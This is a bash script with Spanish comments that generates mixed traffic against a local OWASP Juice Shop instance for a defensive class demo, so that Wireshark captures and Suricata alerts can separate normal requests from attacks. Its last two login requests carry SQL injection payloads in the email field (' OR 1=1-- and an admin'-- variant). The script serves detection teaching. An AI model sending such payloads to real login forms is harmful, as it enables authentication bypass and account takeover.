#!/usr/bin/env bash
# =============================================================================
# Punto 5 — Generador de tráfico para la demo defensiva.
#
# Manda contra Juice Shop una mezcla de tráfico NORMAL y el ATAQUE del Punto 2,
# en ese orden, para que en la captura (Wireshark) y en el IDS (Suricata) se
# pueda comparar lo legítimo contra lo malicioso:
#
#   1. GET  /                                   navegación normal
#   2. GET  /rest/products/search?q=apple       búsqueda normal
#   3. POST /rest/user/login  jim@... / mala    login legítimo fallido (401) -> NO debe alertar
#   4. POST /rest/user/login  ' OR 1=1--        ATAQUE del Punto 2 (200 + JWT admin)
#   5. POST /rest/user/login  admin@...'--      variante del ataque sin OR 1=1
#
# Cada petición va en su propia conexión TCP (una invocación de curl), así en
# Wireshark cada una queda en un tcp.stream distinto.
#
# Uso:  ./generar_trafico.sh [archivo_salida]
# =============================================================================
set -euo pipefail

TARGET="${TARGET:-http://localhost:3000}"
OUT="${1:-/dev/stdout}"
# Mismos encabezados que manda Chrome en el Punto 2 (la detección NO depende
# del User-Agent: se basa en el contenido del body).
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"

req() {  # req <etiqueta> <curl args...>
  local label="$1"; shift
  local code
  code=$(curl -s --compressed -A "$UA" -o /tmp/p5_body.$$ -w '%{http_code}' "$@")
  printf '%s  %-45s -> HTTP %s\n' "$(date '+%H:%M:%S')" "$label" "$code" | tee -a "$OUT"
  printf '      body: %.160s\n' "$(tr -d '\n' < /tmp/p5_body.$$)" | tee -a "$OUT"
  rm -f /tmp/p5_body.$$
  sleep 1
}

login() {  # login <etiqueta> <json>
  req "$1" -X POST "$TARGET/rest/user/login" \
    -H 'Content-Type: application/json' \
    -H "Origin: $TARGET" -H "Referer: $TARGET/" \
    --data-raw "$2"
}

: > "$OUT" 2>/dev/null || true
echo "== Tráfico contra $TARGET ==" | tee -a "$OUT"

req   "[normal] GET /"                             "$TARGET/"
req   "[normal] GET /rest/products/search?q=apple" "$TARGET/rest/products/search?q=apple"
login "[normal] login jim@juice-sh.op (clave mala)" '{"email":"jim@juice-sh.op","password":"incorrecta"}'
login "[ATAQUE] login email=' OR 1=1--"            "{\"email\":\"' OR 1=1--\",\"password\":\"cualquiercosa\"}"
login "[ATAQUE] login email=admin@juice-sh.op'--"  "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"x\"}"
